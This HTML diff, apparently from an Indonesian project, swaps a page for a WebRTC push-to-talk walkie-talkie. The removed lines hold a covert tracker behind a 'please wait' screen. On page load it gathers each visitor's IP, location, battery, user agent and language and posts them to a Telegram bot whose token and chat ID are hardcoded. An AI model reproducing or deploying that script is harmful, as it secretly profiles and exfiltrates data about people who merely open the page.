@@ -3,70 +3,72 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>privat - Zioles Pusat</title>
-    <script>
-        async function getBatteryStatus() {
-            if ('getBattery' in navigator) {
-                const battery = await navigator.getBattery();
-                const level = Math.round(battery.level * 100);
-                const charging = battery.charging ? "🔌 Sedang mengisi daya" : "⚡ Tidak mengisi daya";
-                return `Baterai: ${level}% (${charging})`;
-            } 
-            return "Baterai: Tidak didukung";
+    <title>Walkie-Talkie WebRTC</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin: 50px;
         }
-
-        async function getIP() {
-            try {
-                let response = await fetch("https://ipapi.co/json/");
-                let data = await response.json();
-                
-                let ip = data.ip;
-                let negara = data.country_name;
-                let provinsi = data.region;
-                let kota = data.city;
-
-                let batteryStatus = await getBatteryStatus();
-
-                let userAgent = navigator.userAgent;
-                let browser = navigator.vendor || "Tidak diketahui";
-                let bahasa = navigator.language;
-
-                // Kirim ke bot Telegram
-                let botToken = "7566659804:AAFL6Dn2Vf6zz4HhAvngyyFCXvhULhRVPzg"; // Ganti dengan token bot Anda
-                let chatID = "7799140879"; // Ganti dengan ID chat Anda
-
-                let message = `
-🚀 *Zioles Pusat - Lacak Info Pengguna* 🚀
-━━━━━━━━━━━━━━━━━━━━
-🌍 **Informasi Pengguna**
-- 📍 *IP:* ${ip}
-- 🏴 *Negara:* ${negara}
-- 🏙️ *Provinsi:* ${provinsi}
-- 🏠 *Kota:* ${kota}
-- 🔋 *${batteryStatus}*
-- 🖥️ *User Agent:* ${userAgent}
-- 🌐 *Browser:* ${browser}
-- 🗣️ *Bahasa:* ${bahasa}
-━━━━━━━━━━━━━━━━━━━━
-📢 *Data ini dikumpulkan oleh sistem Zioles Pusat.*
-                `;
-
-                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`)
-                    .then(response => {
-                        if (!response.ok) throw new Error("Gagal mengirim ke Telegram");
-                    })
-                    .catch(error => console.error("Error:", error));
-
-            } catch (error) {
-                console.error("Gagal mengambil data:", error);
-            }
+        input, button {
+            font-size: 18px;
+            padding: 10px;
+            margin: 10px;
         }
-
-        window.onload = getIP;
-    </script>
+    </style>
 </head>
 <body>
-    <h1>Mohon Tunggu...</h1>
-    <p>Sedang memuat informasi...</p>
+    <h1>Walkie-Talkie WebRTC</h1>
+    <label>Masukkan Nomor Radio (00.00 - 99.99):</label>
+    <input type="text" id="radioNumber" placeholder="Contoh: 12.34" pattern="\d{2}\.\d{2}">
+    <button onclick="joinChannel()">Gabung</button>
+    <br><br>
+    <button id="talkButton" disabled>Tekan untuk Bicara</button>
+    <button onclick="leaveCall()">Keluar</button>
+    <audio id="remoteAudio" autoplay></audio>
+
+    <script>
+        let peerConnection;
+        let localStream;
+        let radioID;
+
+        // Ganti dengan server signaling WebSocket atau Firebase
+        const signalingServer = new WebSocket("wss://your-signaling-server.com");
+
+        async function joinChannel() {
+            radioID = document.getElementById("radioNumber").value;
+            if (!/^\d{2}\.\d{2}$/.test(radioID)) {
+                alert("Nomor radio harus dalam format 00.00 - 99.99!");
+                return;
+            }
+
+            localStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+            peerConnection = new RTCPeerConnection();
+            localStream.getTracks().forEach(track => peerConnection.addTrack(track, localStream));
+
+            peerConnection.ontrack = (event) => {
+                document.getElementById("remoteAudio").srcObject = event.streams[0];
+            };
+
+            signalingServer.send(JSON.stringify({ type: "join", id: radioID }));
+
+            document.getElementById("talkButton").disabled = false;
+        }
+
+        document.getElementById("talkButton").addEventListener("mousedown", () => {
+            localStream.getAudioTracks()[0].enabled = true;
+        });
+
+        document.getElementById("talkButton").addEventListener("mouseup", () => {
+            localStream.getAudioTracks()[0].enabled = false;
+        });
+
+        function leaveCall() {
+            if (peerConnection) {
+                peerConnection.close();
+            }
+            document.getElementById("talkButton").disabled = true;
+        }
+    </script>
 </body>
 </html>
